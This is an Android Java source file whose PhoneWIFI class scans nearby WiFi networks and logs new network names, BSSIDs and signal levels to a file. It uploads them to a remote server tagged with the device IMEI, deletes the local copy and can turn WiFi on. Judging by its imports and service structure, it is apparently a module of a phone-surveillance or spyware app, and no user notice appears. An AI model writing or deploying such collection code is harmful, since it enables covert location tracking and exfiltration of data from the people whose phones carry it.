package com.phone.data;

import java.io.File;
import java.io.FileInputStream;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import android.content.Context;
import android.net.wifi.WifiManager;
import android.util.Log;
import com.authority.AuthoritySettings;
import com.main.ForegroundService;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.WriteDateFile;

public class PhoneWIFI implements Runnable{
	
	private static final String TAG = "PhoneWIFI";
	public static final String WIFI_PREFERENCE_NAME = "wifi_prefs";
	//public static final String WIFI_TOTAL_FILENAME = "wifi_all.json";
	private Context context;
	
	public PhoneWIFI(Context context){
		this.context = context;
	}

	
	public void run(){
		processWIFI(context);
	}
	
	public static void updateWIFIList(Context context){
		
		try{		

			WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
	        int wifiState = wifiMgr.getWifiState();
	        if (wifiState == WifiManager.WIFI_STATE_ENABLED) {
	        	List<android.net.wifi.ScanResult>list = wifiMgr.getScanResults();

	        	for (int i = 0; i < list.size(); i++) {
	        		String bssid = list.get(i).BSSID;
	        		if( bssid != null && bssid.equals("") == false){
	        			
	        			String value = PrefOper.getValue(context,WIFI_PREFERENCE_NAME, bssid);
	        			if (value != null && value.equals("") == false ) {
							continue;
						}else{
		        			JSONObject jsobj=new JSONObject();
		        			jsobj.put("name", list.get(i).SSID);
		        			jsobj.put("bssid", list.get(i).BSSID);
		        			jsobj.put("capabilities", list.get(i).capabilities);
		        			jsobj.put("time", list.get(i).timestamp);
		        			jsobj.put("content", list.get(i).describeContents());
		        			jsobj.put("frequency", list.get(i).frequency);
		        			jsobj.put("level", list.get(i).level);
		        			jsobj.put("hash", list.get(i).hashCode());
		        			//jsobj.put("operatorFriendlyName", list.get(i).operatorFriendlyName.toString());
		        			//jsobj.put("venueName", list.get(i).venueName.toString());
							PrefOper.setValue(context,WIFI_PREFERENCE_NAME, bssid, "existed");
							
							WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.WIFILIST_FILE_NAME, 
									jsobj.toString() + "\r\n",true);
						}
	        		}
				}
			}
		}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack= ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getAndParseWIFI exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
		
		Log.e(TAG, "update new wifi info ok");
		return;
	}
	
	
	public static void processWIFI(Context context){
		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.ACCESS_WIFI_STATE) == false){
			return ;
		}
		
		updateWIFIList(context);

		try{
			String filename= ForegroundService.LOCAL_PATH_NAME + ForegroundService.WIFILIST_FILE_NAME;
			File file = new File(filename);
			if (file.exists() == true) {
				FileInputStream fin=new FileInputStream(file);
				int filesize = (int)file.length();
				byte[]buf=new byte[filesize];
				fin.read(buf,0,filesize);
				fin.close();
				
				String str = new String(buf);
				String objs[] = str.split("\r\n");
				if (objs.length > 0) {
					JSONArray jsarray = new JSONArray();
					for (int i = 0; i < objs.length; i++) {
						JSONObject jsobj = new JSONObject(objs[i]);
						jsarray.put(i,jsobj);
					}
					
					if (jsarray.length() > 0) {
						SendDataToServer.sendDataToServer(jsarray.toString().getBytes(), jsarray.toString().getBytes().length,
								Public.CMD_DATA_WIFI, Public.IMEI);
					}
				}
				
				file.delete();
				return;
			}

		}catch(Exception ex){
			ex.printStackTrace();
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getWIFI exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
		}
		
		Log.e(TAG, "process wifi info ok");

	}
	
	
	public static void toggleWifi(Context context,boolean state){
		try {
		    WifiManager wfmanager = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
		    if(wfmanager.isWifiEnabled() == false){
		    	wfmanager.setWifiEnabled(state);
		    	Thread.sleep(10000);
		    }
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
